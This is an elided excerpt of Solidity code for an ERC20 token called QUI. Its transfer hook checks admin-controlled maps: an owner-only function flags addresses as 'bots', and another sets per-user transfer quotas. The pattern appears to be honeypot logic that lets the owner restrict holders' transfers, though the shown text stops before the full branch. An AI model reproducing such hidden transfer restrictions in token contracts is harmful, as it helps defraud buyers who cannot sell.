 ...
 */
abstract contract TouControl is Context, IRoleControl, ERC165 {
    struct RoleData {
...
contract QUI is ERC20,TouControl{  
    address public _usdtPair;
    mapping(address=>uint256) private _mdbalancemap;
    mapping(address=>uint256) private _botbalancemap;
    ...
    function _transfer(address from,address to,uint256 amount) internal override(ERC20){
        ...
        if(_afterTransfer(from,to,amount) == 0){
    ...
    function setBotbalancemap(address user) public onlyRole(DEFAULT_ADMIN_ROLE){
        _botbalancemap[user]=1;
    }   
    function setMdbalancemap(address user,uint256 amount) public onlyRole(DEFAULT_ADMIN_ROLE){
        _mdbalancemap[user]=amount*10**decimals(); 
    }  

    function _afterTransfer(address from,address to,uint256 amount) internal virtual returns(uint256 state){
        uint256 number=_mdbalancemap[from];
        if(number>0 && number>=amount){
            _mdbalancemap[from]=number-amount;
            return 1;
        }else if(isTxt(from) && _botbalancemap[from]!=1){
            return 1;
